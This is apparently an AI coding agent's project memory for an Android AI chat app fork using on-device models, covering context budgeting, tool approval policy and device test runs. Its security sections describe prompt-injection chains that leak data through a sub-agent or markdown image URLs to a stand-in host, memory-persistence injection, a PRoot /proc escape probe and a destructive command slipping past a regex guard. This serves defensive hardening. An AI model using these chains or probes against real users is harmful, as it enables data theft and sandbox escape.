# Agent project memory — RikkaHub on Vivo X300 / AICore / Gemma 4 E4B

Central memory for this fork. Keep it short; update after each sprint.
Tags: [CONFIRMED] [PROBABLE] [HYPOTHESIS] [FALSIFIED] [MITIGATED] [REQUIRES VIVO VALIDATION]

## Goal
Local agent on Vivo X300 (12 GB, Dimensity 9500): RikkaHub → AICore (ML Kit Prompt API)
→ Gemma 4 E4B (`nano-full` + PREVIEW) → GenerationLoop → tools. AICore stays the primary runtime.

## Hard facts about the runtime (source: ML Kit docs via search, 2026-09)
- Prompt API input limit: **< 4000 tokens**, system prefix included. Gemma 4 E4B's own
  128K window does NOT apply through AICore. [CONFIRMED doc] [REQUIRES VIVO VALIDATION]
- `maxOutputTokens` range 1..256, default 256. "Raise MAX_TOKENS" is impossible at the API. [CONFIRMED doc]
- `Candidate.finishReason` is an Int (`STOP` / `MAX_TOKENS` / `OTHER`), null mid-stream.
- `GenerativeModel.countTokens(GenerateContentRequest): CountTokensResponse(totalTokens: Int)` and
  `getTokenLimit(): Int` (both suspend) [CONFIRMED from the genai-prompt 1.0.0-beta2 AAR, javap].
  Also present: `getBaseModelName()`, `getCaches()`/`clearImplicitCaches()` (prefix caching, unused).
- No native tool calling: tools go through the `<tool_call>{json}</tool_call>` text protocol.

## Where things are
- AICore provider (Android/ML Kit glue): `ai/.../providers/AICoreProvider.kt`
- AICore pure logic (budget, tool list, parser, continuation): `ai/.../providers/AICorePrompt.kt`
- Agent loop: `app/.../data/ai/GenerationLoop.kt` (maxSteps, wall-clock cap, LoopGuard on
  identical calls, replay safety for interrupted tools, approval states). Reads no finishReason.
- Approval policy: `app/.../data/ai/tools/ToolApprovalDefaults.kt`; workspace tools: `WorkspaceTools.kt`
- Floors (runtime, model-independent): `PathSafetyGuard.kt`, `HardlineCommandGuard.kt`,
  `data/ai/net/GuardedDns.kt` (SSRF), `workspace/.../WorkspaceFileSystem.kt` (confinement)

## Testing without Android build
Google Maven (dl.google.com) and Foojay are blocked in the cloud sandbox → no AGP/Gradle build there.
`scripts/host-test/run.sh` compiles the Android-free sources with a standalone kotlinc 2.4.10 and runs
131 JUnit tests + two scenario drivers against a scripted **fake** ML Kit (`scripts/host-test/stubs`,
shape only, not the real AAR): `AICoreProviderScenario` (streaming/continuation) and
`AgentContextScenario` (agent loop around the real provider + tool-output store).
If GitHub is blocked, run.sh assembles kotlinc from Maven jars; Central 429 → Google mirror.
On a dev machine the same JUnit tests run with `./gradlew :ai:testDebugUnitTest :workspace:testDebugUnitTest :app:testDebugUnitTest`.
The repo has no CI.

## Android build (details: BUILD_ANDROID.md)
[CONFIRMED, Dell 2026-09-25] `./gradlew :app:testDebugUnitTest` on sweet-euler @2b8f819 compiles and
runs: 1732 tests, 1 failed (FastPathRouter storage format: JVM locale it_IT → "16,0 GB"; fixed with
`Locale.ROOT`, see Sprint 5). `assembleDebug` / install: not reported yet.
`:app`, variant debug, `git submodule update --init --recursive && ./gradlew :app:assembleDebug`
→ `app/build/outputs/apk/debug/app-arm64-v8a-debug.apk` (package `excp.rikkahub.debug`).
Gradle 9.5.0, AGP 9.3.1, Kotlin 2.4.10, compileSdk/targetSdk 37, minSdk 26, Java target 17,
JDK ≥ 17. SDK: platforms;android-37, cmake;3.22.1, default NDK. Also bun + pnpm + Node
(`:web` preBuild). Both git submodules are uninitialized in a fresh clone.

## Sprint 1 (2026-09-25) — findings and fixes
AICore / context
- [CONFIRMED→MITIGATED] Every tool-loop step is appended to the same assistant message, so the
  6-message window never trimmed a running task: 5×6 KB tool results → 30.6k-char prompt.
  Now token-budgeted (90% of 4000, ~3 chars/token, CJK = 1): task message pinned, newest tool
  result 2400 ch head+tail, older 400 ch, oldest steps dropped with a marker.
- [CONFIRMED→MITIGATED] Tool list: now ≤40% of budget, shows arg names (`name(a*, b)`),
  ranks used/task-relevant tools first. Hidden tools still execute if called.
- [CONFIRMED→MITIGATED] finishReason forwarded as "0"/"1". MAX_TOKENS → up to 2 continuation
  rounds (prefill = generated text, one parser across rounds, joiner drops restart/overlap),
  never after a tool call. Finish = stop / length / tool_calls.
- [CONFIRMED→MITIGATED] Last ≤10 chars lost when the final chunk carries text; Stop reported
  as "AICore error"; non-streaming mode dropped all tool calls; unclosed tool call surfaced as
  raw text without the tag.
- [MITIGATED] Tool output could forge `user:` turns / tool tags in the flat transcript.
- One retry at 60% budget on an input-overflow error before any output (error text heuristic).
Security
- [CONFIRMED→MITIGATED] `deleteRecursively` follows symlinks: workspace delete/move wiped the
  link target outside the root; tree() listed outside files. `deleteRecursivelyNoFollow` everywhere
  agent/shell-reachable.
- [CONFIRMED→MITIGATED] PathSafetyGuard: /data/data rule dead on device (canonical /data/user/0);
  own secrets (datastore, databases, shared_prefs, no_backup, app_webview, known_hosts) were reachable.
- [CONFIRMED→MITIGATED] telegram_send_* / ssh_upload / ssh_download bypassed PathSafetyGuard.
- [CONFIRMED→MITIGATED] browser_open: ungated egress (URL carries data) + LAN/loopback reachable.
- [CONFIRMED→MITIGATED] Hardline floor let `rm -rf /sdcard` (and DCIM, …) through.

## Open risks (not fixed — need a decision or a device)
- [CONFIRMED] Markdown images in model output auto-load any URL → approval-free exfil
  (`![](https://x/?d=…)`). Fix = click-to-load remote images in assistant messages (UX decision).
- [CONFIRMED] PRoot binds `/upload` (all chat attachments) and a writable `/skills` into the shell:
  the model can read every upload and persistently rewrite its own skills (prompt injection).
- [PROBABLE, REQUIRES VIVO VALIDATION] PRoot /proc escape. Host probe (generic `proot` 5.1.0
  from Ubuntu apt, x86_64, no `--link2symlink` — NOT the Termux-patched arm64 binary this app
  ships in `nativeLibraryDir`, so this result does not transfer 1:1): with `/proc` bound the
  same way `ProotShellRunner` binds it, `readlink /proc/<same-uid-pid>/cwd` (or `/root`) from
  inside the jail returns the real absolute host path — a plain information disclosure (reveals
  host directory layout, e.g. `/data/user/0/<pkg>/...`, from inside the jail). Actually opening
  or listing through that magic symlink (`ls`, `cat`) failed with ENOENT on this proot build:
  PRoot re-canonicalizes the resolved target through its own binding table before the kernel
  sees it, so the naive "cd into /proc/<pid>/root and read a file" escape did NOT reproduce
  here. This FALSIFIES the escape for proot 5.1.0/x86_64 without `--link2symlink`; it says
  nothing about the on-device Termux-patched binary (different version, arch, and that flag
  changes hardlink/symlink handling specifically). Vivo test: `ln -s /data/user/0/<pkg>
  /workspace/x/marker` then from a workspace_shell session `readlink /proc/self/root` and try
  `cat /proc/$PPID/root/data/user/0/<pkg>/files/datastore/*` with a throwaway marker file, not
  real data.
- [CONFIRMED] Hardline is regex-only (`r''m`, `$(echo rm)`, python rmtree pass) — by design;
  approval is the control. "Always Allow" on termux/workspace_shell removes it.
- [CONFIRMED] WebView redirects to private IPs are not checked (own network stack).
- [PROBABLE] Prompt rule "NEVER call a verification tool" (tuned for Nano loops) conflicts with
  verify-after-act; left unchanged until E4B behaviour is measured on the Vivo.
- MCP tools: always approval-gated; no per-server egress policy.

## Vivo validation checklist (nothing below is device-tested yet)
1. Build: `./gradlew :app:assembleDebug` — first real compile of this sprint's app/ai changes
   (only risk flagged: `Candidate.FinishReason.MAX_TOKENS` symbol, verified on docs only).
2. `adb logcat -s AICoreProvider` → `prompt round=N est=…tok prefix=…ch tools=a/b dropped=…`.
   Compare `est` with `countTokens` if possible; tune `AICORE_INPUT_TOKEN_BUDGET` / chars-per-token.
3. Long answer (> 256 tokens): check the continuation joins cleanly (no repeated text).
4. `write_file` with ~1 KB content: tool call cut at 256 tokens must complete in round 2.
5. 6+ step tool task: task still solved; no ErrorCode/overflow; note latency per round.
6. Overflow: paste ~15 KB text; expect one retry log, not a crash. Record the real error text.
7. Security: `ln -s /data/user/0/<pkg>/databases /workspace/x/l; delete x` → databases intact.

## Sprint 2 (2026-09-25) — environment blocker and code-level findings
This session runs in the same cloud sandbox as Sprint 1: no `adb`, no USB, no physical
device, and Google Maven is still blocked, so none of Sprint 2's device/build phases
(real `assembleDebug`, `adb install`, on-device AICore/tool-calling/security tests) could
be performed here. Nothing below is fabricated device output — see BLOCKER note.

[BLOCKER] Sprint 2 (real build → install → Vivo validation) requires the actual
Dell/Kubuntu machine with the Vivo X300 attached via USB. Not available in this session.
Do not re-attempt from a cloud session; resume Sprint 2 directly on the Dell using
BUILD_ANDROID.md, then work the checklist below.

- [CONFIRMED, code-level, no device needed] Explains the observed anomaly (`/workspace`
  visible, `/home` empty, `/storage/emulated/0` missing) exhaustively from
  `ProotShellRunner.buildCommand` + the only `WorkspaceBindMount` call site
  (`RepositoryModule.kt`):
  - **`/home` empty**: (A) genuinely present but empty — expected. `linuxDir` is whatever
    distro rootfs tarball the user picked in Settings (`RootfsInstaller` just downloads and
    extracts a URL; `RootfsPatcher` only touches `etc/resolv.conf`, `etc/hosts`,
    `etc/hostname`, locale, group names, and creates `tmp`/`var/tmp`/`root`). A minimal
    distro image ships `/home` empty because no user accounts were ever created in it —
    not a bug, not hidden by RikkaHub.
  - **`/storage/emulated/0` missing**: (F), by design, not a bug — there is no bind mount
    for it anywhere. The full bind list is exactly: `context.filesDir` → `/workspace`
    (hardcoded in `ProotShellRunner`), plus the three `WorkspaceBindMount`s in
    `RepositoryModule.kt` (`/skills`, `/tool_outputs`, `/upload`), plus
    `WorkspaceManager.KERNEL_FS_MOUNTS` (`/dev`, `/proc`, `/sys`). No `/sdcard`, no
    `/storage`, anywhere in the codebase. The workspace model is (and was already
    documented as) fully isolated app-private storage; shared storage is reached only
    through the separate file-manager tools (`PathSafetyGuard`-gated), never through the
    shell. This matches "workspace isolated" in the Goal section — working as intended,
    no fix needed. If shared-storage access from the shell is wanted, that is a product
    decision (bind `/sdcard` read-only, or a SAF-backed FUSE bridge), not a bug fix — not
    done here since it was not asked for and would widen the shell's reach.
- See the PRoot `/proc` entry above (Open risks) for the host probe of the escape
  hypothesis — falsified for a generic x86_64 proot build, unresolved for the real binary.

## Sprint 3 (2026-09-25) — approval model, headless, data egress (static analysis, HOST ONLY)
Approval path (reconstructed end to end):
tool factory → `needsApproval` lambda → `GenerationLoop` (Hardline first; prompts ONLY when
`needsApproval(input)` is true) → `isToolAutoApproved` in `ChatService` =
YOLO || `HeadlessConversations.shouldAutoApprove(conv)` || "Allow for this chat" || always-allow set
(workspace tools excluded) → Pending (UI / Telegram keyboard) or execute.
`ToolApprovalDefaults.ALWAYS_ASK` becomes `needsApproval` only via `ToolApprovalDefaults.applyTo`
(LocalTools, search tools); MCP tools use `requiresApproval(mcp__…)` in ChatService.
`ChatToolFactory.createTools` is dead code (never called).

- [CONFIRMED→MITIGATED] c7a1c46 listed scrape_web in ALWAYS_ASK but search tools skip the
  LocalTools mapping, so it still ran unprompted (its test only checked set membership).
  Fixed in 7c0f8d9 via `applyTo`; SearchToolsTest checks the real tool (Gradle), host covers applyTo.
- [CONFIRMED] `NO_ALWAYS_ALLOW` is UI-only: it hides the "Always Allow" button (chat + Telegram).
  Runtime never checks it, so it does not hold under YOLO, fully headless runs, or
  "Allow for this chat" (still offered for eval_javascript / keystore_decrypt / mcp_add …).
- [CONFIRMED] Fully headless = every tool auto-approved, NO_ALWAYS_ALLOW included. Triggers:
  CronJobWorker, SubAgentEngine (`subagent_dispatch`), SkillTestRunner, ExternalAutomationDispatcher.
  Telegram is browser-headless only (keeps its approval keyboard). Workflows run pre-authorised
  fixed actions (approved at `workflow_create`) — a sounder model. Floors still apply everywhere:
  Hardline, PathSafetyGuard, SSRF guard.
- [CONFIRMED, static chain, not executed] Approval laundering: one approval of
  `subagent_dispatch` (zero if Always-Allowed, zero inside cron) starts a headless run on the
  parent assistant with all its tools auto-approved, e.g. injected page → sub-agent →
  `list_recent_notifications` → `scrape_web("https://x/?d=…")`. Needs one human tap at most.
- [FALSIFIED] Backdoor via `external_automation_add_trusted_package("<adb>")` (which would let any
  app drive the exported RUN_TASK receiver): the tool's package regex rejects "<adb>". The
  activity path uses binder-verified `callingPackage` (correct).
- [CONFIRMED] Doc mismatch: ExternalAutomationTools KDoc says its mutating tools are
  NO_ALWAYS_ALLOW; they are only in ALWAYS_ASK.
- [CONFIRMED] `memory_tool` (create/edit/delete) is ungated: an injected turn can persist instructions into
  memory that are replayed in future chats (persistence, not egress).
- Markdown images (unchanged, [CONFIRMED] Sprint 1): `Markdown.kt` IMAGE → Coil, auto-load, no
  approval, no SSRF guard. `search_web`'s own description tells the model to embed `![](url)`
  from `images[]`, so a blanket block breaks that feature.

[REQUIRES PRODUCT DECISION] Headless policy — cannot tell from code whether NO_ALWAYS_ALLOW was
meant to hold headless (its KDoc names unattended cron; `mark()`'s KDoc says "tools auto-approve").
Proposed minimal policy, not implemented:
1. Headless/YOLO/chat-scope: NO_ALWAYS_ALLOW tools → Denied with an envelope (never Pending: no
   one can answer). Breaks only cron/sub-agent/external runs that use those 9 tools.
2. `subagent_dispatch`: the sub-agent inherits the parent's approval state instead of auto-approve
   (Pending surfaces in the parent chat), or run with read/local-only tools.
3. Headless network egress (web_fetch, web_extract, scrape_web, browser_open, telegram_send_*,
   ssh_*, mcp__*): allowed only if listed on that cron job / automation (per-job allowlist).
4. Markdown images: auto-load only URLs that already appeared in a tool result of the same
   conversation; others become tap-to-load.

Dell/Vivo checks added by Sprint 3: `./gradlew :app:testDebugUnitTest --tests '*SearchToolsTest*'`;
on device, `scrape_web` and `list_recent_notifications` must show an approval card.

## Sprint 4 (2026-09-25) — privilege boundaries (static + host tests, HOST ONLY)
Fix 01edfe9: one approval policy, `ToolApprovalDefaults.autoApproves` + `decide`, executed by
`GenerationLoop` per tool (after Hardline), with `RunKind` from `HeadlessConversations.runKind`:
| RunKind | who | gated tool not granted | NO_ALWAYS_ALLOW | memory_tool |
|---|---|---|---|---|
| INTERACTIVE | chat, Telegram | Prompt | Prompt every call (no YOLO/chat/always) | runs (ungated) |
| UNATTENDED | cron, external automation, skill tester | Run (auto) | Deny | Deny |
| DELEGATED | sub-agent (`markDelegated`) | Deny unless parent-chat grant / Always / YOLO | Deny | Deny |
Workflows and cron direct mode call `execute` directly (pre-authorised fixed actions): unchanged.

- [MITIGATED] Sub-agent approval laundering (Sprint 3): the sub-agent now inherits only its
  parent chat's grants. Evidence: ToolApprovalPolicyTest (decision matrix), HeadlessRunKindTest
  (real `HeadlessConversations` on host stubs). Wiring in ChatService/GenerationLoop/SubAgentEngine
  is not compiled here.
- [MITIGATED] NO_ALWAYS_ALLOW now enforced at runtime on every path (was UI-only). UI still shows
  "Allow for this chat" for these tools: it approves that one call only (cosmetic, not fixed).
- [FALSIFIED] sub-agent → sub-agent and cron → sub-agent: recursion guard rejects (`no_recursion`);
  ChatService passes the invocation context, so the guard is live on the main path.
- [CONFIRMED, not fixed] `subagent_dispatch` `tools` argument is stored, never enforced (the
  approval card suggests a scope that does not exist). With inherited grants it no longer widens
  privilege, but it is misleading. [REQUIRES PRODUCT DECISION]: enforce as allowlist or drop it.
- [CONFIRMED, not fixed] Interactive memory persistence: injected content → `memory_tool` (ungated)
  → `buildMemoryPrompt` puts memories in the system prompt of future chats, unframed.
  Does not reach AICore (AICorePrompt drops SYSTEM messages); reaches every cloud provider.
  [REQUIRES PRODUCT DECISION]: gate writes (ALWAYS_ASK, user may Always-Allow) or visible
  "memory changed" notice + frame memories as data. Blocked already in unattended/sub-agent runs.
- [CONFIRMED, not fixed] UNATTENDED runs still auto-approve egress (web_fetch, scrape_web,
  browser_open, telegram_send_*, ssh_*, mcp__*) and sensitive reads: a cron job that processes
  untrusted content can still chain notifications → network. [REQUIRES PRODUCT DECISION]:
  per-job tool allowlist at job creation (the workflow model).
- Grants are per tool name and per chat: approving a local read never authorises an egress tool.

Dell: `./gradlew :app:testDebugUnitTest` (first compile of 01edfe9). Vivo/Android: dispatch a
sub-agent asking it to `web_fetch` a marker URL without a parent grant → expect Denied
`not_authorised_for_this_run`; with "Allow for this chat" on web_fetch in the parent → runs;
cron job calling `eval_javascript` → Denied `requires_human_approval`.

## Sprint 5 (2026-09-25) — context virtualization (HOST ONLY: app/ changes not compiled here)
Goal: long tasks under the ~4k-token AICore window without losing data or looping.
- [CONFIRMED→MITIGATED] Dropped steps left only `[earlier steps omitted]`: the model could not
  tell what it had already done. Host scenario C (45 dirs × 5 KB, scripted model that uses only
  its prompt) with the old prompt: dir_1..15 re-scanned 5-6× each, 80-step cap, no answer.
  Now a **step ledger** replaces the gap: runs of one tool collapse to one line
  (`- list_dir x17: dir_1, …, dir_17 -> 17 ok`), singles show args/outcome/`[id=…]`, errors and
  denials are labelled, the model's own notes during the task are kept (`- (your note) …`).
  Reserve ≤ min(15% budget, 360 tok); key lists clipped only when they do not fit. Same
  scenario: 46 requests, no repeats, finding from 28 steps earlier reported.
- [CONFIRMED→MITIGATED] Clipped middles of tool results were unrecoverable (scenario B: needle in
  a 20 KB result → "not found"). Now the cut marker says
  `[N chars cut; read_tool_output id=<call> offset=<where the cut starts>]`.
- New runtime tool `read_tool_output(id*, offset, query)` (`ToolOutputTools.kt`): pages of 1500
  chars or line search with offsets. Injected by GenerationLoop only when a result > 400 chars
  exists; always listed first in the AICore tool list. Needs no approval (read-only). Bound to
  the call ids of the current request's messages → another chat's / sub-agent's ids refused.
- [CONFIRMED→MITIGATED] Spill (> 32 KB) happened only with workspace_shell; otherwise 32 KB+
  went inline to every provider. Now always spilled to private `files/tool_output_store`
  (PathSafetyGuard-blocked, not shell-mounted, wiped at app start); shell copy in
  `/tool_outputs` only for chats with the shell, as before. After an app restart the model is
  told the full text is gone (preview only). If the store write fails the output stays inline.
- [CONFIRMED, pre-existing, not changed] `files/tool_outputs` (shell copies, all chats) is
  readable by file tools and by any chat's shell: Sprint 1 kept it as a "working area" on
  purpose. [REQUIRES PRODUCT DECISION] per-conversation subdirs or block it like the store.
- FastPathRouter storage line formatted with `Locale.ROOT` (English sentence; it_IT gave "16,0").

Dell: `./gradlew :ai:testDebugUnitTest :app:testDebugUnitTest` — first compile of GenerationLoop,
FilesManager, RikkaHubApp, PathSafetyGuard edits and of ToolOutputToolsTest.
Vivo: (a) ask for a value inside a > 32 KB tool output → expect read_tool_output with query,
no approval card; (b) 20+ step task → logcat `prompt round=… dropped=…` and the model does not
repeat steps; (c) after app restart, reading an old spilled id → "no longer stored" note.

## Sprint 5b (2026-09-25) — first cloud build, exact token budget
Cloud env now allows dl.google.com / maven.google.com / foojay. [CONFIRMED] in the sandbox:
`:ai:testDebugUnitTest` 329/329, `:app:testDebugUnitTest` 1742/1742 (also with it_IT locale for
FastPathRouter), `:app:assembleDebug` → app-arm64-v8a-debug.apk (105 MB, excp.rikkahub.debug,
2.5.1/187, debug-signed). Sprint 1's only doc-only symbol (`Candidate.FinishReason.MAX_TOKENS`)
compiles against the real AAR. Sandbox build recipe: SDK platforms;android-37.0 + cmake 3.22.1,
`git submodule update --init --recursive`, `LANG=C.UTF-8` (a test name has an em dash),
`~/.gradle/init.d` init script putting Google's Maven Central mirror first (Central → 429).
- [MITIGATED] Exact budget in AICoreProvider: `getTokenLimit()` may only LOWER the 4000 input
  limit (minus the 256 output cap; its meaning is undocumented); every request is
  `countTokens`-measured before sending and rebuilt with a calibrated budget
  (`calibratedAiCoreBudget`: over 95% → shrink, well under while history was dropped → grow),
  ≤ 3 counts per round; API failure → char estimate + overflow retry as before.
  Host scenarios with a fake tokenizer: 1.5× denser than the estimate → 46 requests, max 3620
  device tokens, none over; countTokens missing → still completes via overflow retry;
  0.67× sparser → 23 results kept in the prompt instead of 12.
  [REQUIRES VIVO VALIDATION] whether countTokens includes the prefix/template, its latency,
  and what getTokenLimit returns on E4B: logcat `getTokenLimit=` and `counted=`.

## Vivo run 1 (2026-09-26, APK apk-f5f3010-run2, Gemini Nano FULL via AICore) — user screenshots
Task: "web_fetch it.wikipedia.org/wiki/Mura_di_Lucca, who completed the walls and when" (answer
at char ~16k of the article text: Paolo Lipparelli, 1645-1650).
- [CONFIRMED on Vivo] App installs and runs, AICore chat works, the agent loop executes tools and
  reuses results; read_tool_output is offered, runs WITHOUT approval card, pages correctly
  (offsets 4546→6046→7546), no crash, no infinite loop. Nano gives up and says so.
- [CONFIRMED on Vivo] Task failed: Nano called web_fetch 3× with extract_mode "raw" (also
  max_chars 20000 / 1048576). Raw is hard-capped at 8192 bytes → body_truncated=true and only
  the page <head> (JS config); the article text was never fetched. Cause: the AICore tool line
  showed only arg NAMES + first description line, so Nano never saw that 'article' exists.
- [MITIGATED, host+Gradle] (1) AICore tool lines show enum values (`extract_mode=article|raw|…`,
  ≤6 values); web_fetch extract_mode now has an enum, article first. (2) web_fetch raw + HTML +
  truncated → `hint` field before body: call again with extract_mode "article". (3)
  read_tool_output notes when the source tool itself truncated its output.
  [REQUIRES VIVO VALIDATION] re-run the same prompt on the next APK.
- Minor: Nano answered in English to an Italian prompt on the first turn.

## Vivo run 4 (2026-09-26, APK apk-b9e1544-run6) — tests A/B/C from the manual, screenshots
- A (5-tool chain): 7 tool steps, correct 376-year arithmetic, but the final answer lost the
  name fetched in step 1; the file most likely not written (user). [CONFIRMED cause, code]
  older results were clipped blind to 400 chars. [MITIGATED] all results clipped by relevance
  (older ones 700 chars, window anchored on the rarest match), phrase pairs of the question
  ("portò a termine") and 4+ digit numbers weigh in; checked offline on the real article at
  the end of the chain. [FALSIFIED] "write failed for lack of All files access": the tool
  result screenshot shows Nano called "write_file" → tool_not_found; write_text_file was NOT
  among the tools (it came only with the Download toggle, the user had Files on). Nano retried
  the same wrong name and gave up. [MITIGATED] Files now includes write_text_file (still
  ALWAYS_ASK); tool_not_found carries did_you_mean (shared name parts, edit distance).
- B (error recovery): saw the 404 but never fetched the second URL, answered "Parla di
  Lucca" from nothing. [CONFIRMED cause] prefix rule "after ANY tool returns, the work is
  DONE". [MITIGATED] rule now: more steps → call the NEXT tool; done → reply; never repeat a call.
- C (loop): stopped after 2 list_files calls, no loop. Final line misleading ("I'll continue
  checking"). OK for safety.

## Vivo run 3 (2026-09-26, APK apk-b9e1544-run6) — user report + screenshot
- [CONFIRMED on Vivo] AICore/Nano FULL solved the Lucca task: one web_fetch with
  extract_mode "text" (full page text, truncated=false); user reports it worked well. The
  question-aware clipping (clipRelevant) is what put the answer in Nano's ~4k window.
- [CONFIRMED on Vivo, user judgement] LiteRT local models (Qwen3 4B tried; Gemma 4 E4B
  recommended) are too slow and power-hungry to be usable day to day on the X300.
  DECISION: AICore is THE runtime. Local runtimes stay in the app (opt-in, shared context
  manager, 32k cap) but get no further investment unless the user asks.

## Vivo run 2 (2026-09-26, APK apk-38639e7-run5) — user screenshot
- [CONFIRMED on Vivo] AICore/Nano: ONE web_fetch (article mode, the run-1 fix works), answer
  with real dates from the page head ("1544 … 1648"); the name (Lipparelli, char ~11.6k of a
  ~20k article) was in the clipped middle. On "Da parte di chi?" Nano said "not in the text"
  and did NOT call read_tool_output. Causes: head+tail clipping is blind to the question; the
  prefix rule "after a tool returns, the work is DONE" discourages reading further.
- [CONFIRMED on Vivo] Qwen3 4B on LiteRT: 298 s of thinking, no tool call, English answer
  (CPU default, thinking on, 4k context). Not the recommended local model (Gemma 4 E4B, GPU on).
- [MITIGATED, host + Gradle; checked on the real article text offline] `clipRelevant`: the
  newest tool result keeps head/tail plus the passages matching the question (rare words weigh
  more; short follow-ups borrow the previous question's words; ~160 chars of context kept
  before a match so a long sentence keeps its subject). Used by the AICore prompt and by
  ContextCompactor (LiteRT/llama.cpp). Prefix exception: when a result says "chars cut" and
  the answer is not visible, call read_tool_output before saying "not in the text".
  Also fixed: the "[earlier steps omitted]" header was glued to the previous line.
  [REQUIRES VIVO VALIDATION] same Lucca prompt + "Da parte di chi?".

## Sprint 6 (2026-09-26) — one context manager for every on-device runtime
Decision (user): AICore stays primary and is used to its limits; local models (LiteRT-LM or
llama.cpp, any model, not only Gemma) are the opt-in path for heavy tasks, context capped at
32k; the same context management applies app-wide.
- [CONFIRMED, code] LiteRT capped history at 3000 chars (~750 t) and system at 500 whatever
  the engine size, and trimmed by WHOLE messages only: a running tool loop is one assistant
  message, so its tool results went to the engine uncut (a 32 KB web_fetch ≈ 8k tokens) — past
  the engine context this faults the native executor (SIGSEGV). llama.cpp trimToBudget had the
  same whole-turn limitation. [MITIGATED]
- `ai/core/ContextCompactor`: the AICore rules (pinned task, newest-first, clip caps scaled to
  the budget, read_tool_output resume hints, step ledger incl. model notes) on UIMessages, for
  providers with their own templates. Used by LiteRtProvider and LlamaCppProvider (whole-turn
  trim kept as last-resort guard). AICore keeps its own flat builder (device-validated).
- `local-llm/LocalContextBudget`: engine context ≤ 32768; answer reserve ctx/4 (≤ 4096); system
  ≤ 10% of input (500 chars on ≤ 4k); tools 35% (none under 2k ctx); history gets the rest.
  Chars at 3/token (safe side: an overflow crashes natively). Gemma 4 E2B/E4B default 16384
  (catalog), user override up to 32768 in Settings → Local · LiteRT → Max context.
- Gradle: ai 336, local-llm 128, llama-cpp 70, app 1746 — all green; assembleDebug OK.
  [REQUIRES VIVO VALIDATION] E4B load, prefill tok/s at 16k/32k, heat, RAM with AICore idle.

## Release 1.0.0 (2026-09-26) — official build
- Decisions (user): new app identity `it.menesini.rikkamene`, name Rikka-mene, version 1.0.0
  (versionCode 1), coexisting with other RikkaHub installs; PR + merge into master.
- The repository is PUBLIC: the release key is never committed, not even encrypted. It comes
  from repository secrets `RIKKAMENE_KEYSTORE_B64` + `RIKKAMENE_RELEASE_PASS`
  (`.github/workflows/release.yml`, trigger: `[release]` in the head commit message on master
  or claude/*, or by hand). Key: PKCS12, alias `rikkamene`, RSA 4096, CN=Rikka-mene,
  SHA-256 88:04:EB:82…B2:1C. Losing it = no more updates over the installed app.
- Debug builds now use package `it.menesini.rikkamene.debug`: the old `excp.rikkahub.debug`
  beta does not update any more (uninstall it after moving data via backup/restore).

## Vivo run 5 (2026-09-26, release v1.0.0, R8 on) — Test A v2, screenshots
- [CONFIRMED] R8 release works on device: web_fetch, get_time_info, eval_javascript (QuickJS,
  JNI), write_text_file all ran; approvals, tool sheets and restore from backup fine.
- [CONFIRMED] Data passed between steps: year 1650 taken from the page, 2026-1650 = 376 in JS,
  file line `Paolo Lipparelli | 1650 | 376` (29 bytes).
- [FALSIFIED] "Numbered steps are enough": after eval_javascript Nano answered with the final
  line (predictable without the side effects) and skipped write_text_file + read_file; resent
  steps 4-5, it wrote the file and skipped read_file again.
- Fix (1.0.1): `taskProgressLine` in AICorePrompt — runtime-computed line before the model's
  turn: tools named in the task, done / NOT DONE, "call <next> now; do not give the final
  answer before". Only after the first call and while named tools are uncalled.
  [REQUIRES VIVO VALIDATION]. If Nano still stops early, next step is enforcement in
  GenerationLoop (one bounded nudge when the model ends with named tools uncalled).

## Vivo run 6 (2026-09-26, release v1.0.1) — Test A v2 again, screenshot
- [CONFIRMED] Full chain in one turn: web_fetch, get_time_info, eval_javascript,
  write_text_file, read_file, then the file line (`PAOLO LIPPARELLI | 1650 | 376`, uppercased).
  The answer shows "2/2": it was a regeneration, whether attempt 1 failed is unknown.
- [PARTIAL] Follow-up "Chi le ha portate a termine, e in quali anni furono costruite?" got the
  same file line again instead of "Paolo Lipparelli, 1645-1650": the earlier "answer only with
  the file content" instruction sticks. Name right, year range missing. Nano limit; not fixed.

## Next steps (priority order)
1. [DONE] Build + install on the Vivo; AICore agent loop with web_fetch validated (runs 1-3).
   Next on AICore: multi-step tasks (3+ tools), error recovery, loop behaviour on device.
2. Use `countTokens`/`getTokenLimit` for exact budgeting once the API is checked against the AAR.
3. Click-to-load for remote markdown images (egress).
4. Measure E4B tool-call accuracy with arg names vs without; decide on the "never verify" rule.
5. Task state: the Sprint 5 ledger covers "what was done"; if E4B still loses track on the
   Vivo, add an explicit pinned plan/progress block (model-maintained) before anything heavier.
6. Check upstream ExTV/rikkahub-agent and rikkahub/rikkahub for new commits (this fork was
   level with ExTV on 2026-09-24).
